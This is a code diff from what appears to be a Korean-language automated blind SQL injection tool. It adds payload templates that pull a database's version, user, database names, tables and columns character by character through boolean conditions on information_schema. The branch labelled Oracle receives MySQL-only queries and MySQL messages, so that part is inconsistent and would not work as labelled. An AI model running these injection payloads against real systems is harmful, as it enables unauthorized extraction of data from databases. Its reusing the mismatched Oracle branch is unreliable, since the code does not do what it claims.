@@ -198,18 +198,47 @@ def setpayload():
 
 	if dbms == 'oracle':
 		if args.basic:
-			print("[*] Oracle 기본 정보 출력 Start")
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
 			payloads = {
-
+				'Version': {
+					'count': "",
+					'len': "(SELECT length((SELECT @@version)))>{mid_val}",
+					'version': "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"
+				},
+				'User': {
+					'count': "",
+					'len': "(SELECT length((SELECT user())))>{mid_val}",
+					'version': "ascii(substr((SELECT user()),{substr_index},1))>{mid_val}"
+				},
 			}
-		elif args.dbs:
-			print("[*] Oracle DB 출력 Start")
+		if args.dbs:
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL DB 출력 Start{Colors.END}\n")
 			payloads = {
-
+				'Dbs': {
+					'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
+					'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
+					'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				}
 			}
-		else:
-			print("Use --help for more info. (oracle)")
-
+		if args.tables:
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 테이블 출력 Start{Colors.END}\n")
+			payloads = {
+				'Tables': {
+					'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
+					'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
+					'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				}
+			}
+		if args.columns:
+			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 컬럼 출력 Start{Colors.END}\n")
+			payloads = {
+				'Columns': {
+					'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
+					'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
+					'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				}
+			}
+			
 	elif dbms == 'mysql':
 		if args.basic:
 			print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL 기본 정보 출력 Start{Colors.END}\n")
@@ -337,7 +366,7 @@ def query_start():
 	result_tmp = []
 	result_data = {}
 	data_len  = 0
-	dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수
+	# dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수
 	select_tables = [None] # --dbs, --tables 를 실행할때는 None으로 설정
 
 	payloads = setpayload() # 인수에 따른 페이로드 셋팅
